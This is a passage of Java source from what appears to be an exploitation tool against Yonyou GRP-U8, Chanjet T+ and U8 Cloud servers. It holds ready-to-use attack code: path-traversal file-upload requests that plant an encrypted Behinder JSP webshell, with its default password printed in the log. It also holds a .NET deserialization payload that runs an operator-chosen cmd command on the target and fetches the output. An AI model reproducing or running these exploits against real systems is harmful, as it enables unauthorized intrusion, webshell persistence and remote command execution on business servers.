            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 GRP-u8 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_UploadFileData(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 GRP-u8 任意文件上传漏洞");
        String url = "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg";
        String data = "------WebKitFormBoundary92pUawKc\n" +
                "Content-Disposition: form-data; name=\"myFile\";filename=\"test.jpg\"\n" +
                "\n" +
                "shellcode\n" +
                "------WebKitFormBoundary92pUawKc--";
        switch (type){
            case EXP:
                String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
                data =data.replace("shellcode",payload);
                HttpRequest httpRequest1 = new HttpRequest(target+url);
                httpRequest1.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary92pUawKc");
                Response result1 = httpRequest1.Post(data);
                if(result1.statusCode==200 && result1.responseBody.contains("showSucceedMsg")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问路径:"+target+"/R9iPortal/debugg.jsp");
                    WriteLog("\n[*] 默认连接密码rebeyond");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case POC:
                data =data.replace("shellcode","<% out.println(\"123\");%>");
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary92pUawKc");
                Response result = httpRequest.Post(data);
                if(result.statusCode==200 && result.responseBody.contains("showSucceedMsg")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问路径："+target+"/R9iPortal/debugg.jsp");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 畅捷通 T+ 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_TPlus_Upload(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 畅捷通 T+ 任意文件上传漏洞");
        String randomStr = Utils.getRandomString(4)+".txt";
        String url = "/tplus/SM/SetupAccount/Upload.aspx?preload=1";
        String data = "------WebKitFormBoundarysHT4cEvOAWALSZEv\n" +
                "Content-Disposition: form-data; name=\"File1\";filename=\"../../../filename\n" +
                "Content-Type: image/jpeg\n" +
                "\n" +
                "shellcode\n" +
                "------WebKitFormBoundarysHT4cEvOAWALSZEv--";
        switch (type){
            case EXP:
                break;
            case POC:
                data =data.replace("shellcode","Yep,This is what you asked for");
                data =data.replace("filename",randomStr);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarysHT4cEvOAWALSZEv");
                httpRequest.Post(data);
                Response response = new HttpRequest(target+randomStr).Get("");
                if(response.statusCode==200 && response.responseBody.contains("Yep,This") ){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 详细利用方法："+"https://github.com/zhaoyumi/yoyoExploit/blob/main/README.md");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 畅捷通 T+ 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_U8Cloud_Upload(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 畅捷通 T+ 任意文件上传漏洞");
        String randomStr = Utils.getRandomString(4)+".jsp";
        String url = "/linux/pages/upload.jsp";
        String data ;
        switch (type){
            case POC:
                data = "<% out.println(\"025986327\");%>";
                HttpRequest httpRequest1 = new HttpRequest(target+url);
                httpRequest1.addHeaders("Content-Type","application/x-www-form-urlencoded");
                httpRequest1.addHeaders("filename",randomStr);
                httpRequest1.Post(data);
                Response response1 = new HttpRequest(target+"/linux/"+randomStr).Get("");
                if(response1.statusCode==200 && response1.responseBody.contains("025986327") ){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+"/linux/"+randomStr);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                data = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","application/x-www-form-urlencoded");
                httpRequest.addHeaders("filename",randomStr);
                httpRequest.Post(data);
                Response response = new HttpRequest(target+"/linux/"+randomStr).Get("");
                if(response.statusCode==200 ){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+"/linux/"+randomStr);
                    WriteLog("\n[*] 冰蝎webshell，默认连接密码rebeyond");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                };
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 畅捷通T+ .net反序列化命令执行漏洞",SupportVulType = SupportVul.RuntimeExec)
    public void vul_QVD_2023_13615(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 畅捷通T+ .net反序列化命令执行漏洞");
        String filepath = Utils.getRandomString(4)+".txt";
        String url = "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore";
        String data = "{\n" +
                " \"storeID\":{\n" +
                "  \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
                "  \"MethodName\":\"Start\",\n" +
                "  \"ObjectInstance\":{\n" +
                "   \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
                "   \"StartInfo\":{\n" +
                "    \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
                "    \"FileName\":\"cmd\",\n" +
                "    \"Arguments\":\"/c command\"\n" +
                "   }\n" +
                "  }\n" +
                " }\n" +
                "}";
        switch (type){
            case EXP:
                String cmd = Cache.uiController.exCommandText.getText();
                String payload = cmd+" > "+filepath;
                data =data.replace("command",payload);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("X-Ajaxpro-Method", "GetStoreWarehouseByStore");
                Response result = httpRequest.Post(data);
                if (result.statusCode == 200 && result.responseBody.contains("actorId")){
                    Response response = new HttpRequest(target+"/tplus/"+filepath).Get("");
                    if(response.statusCode==200 && response.responseBody != ""){
                        WriteLog("\n[*] 存在漏洞，使用命令执行查看");
                        WriteExpLog("\n[*] 命令回显："+response.responseBody);
                    }else {
                        WriteLog("\n[*] 存在漏洞，但无回显");
                    }
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case POC:
                break;
        }
    }


}
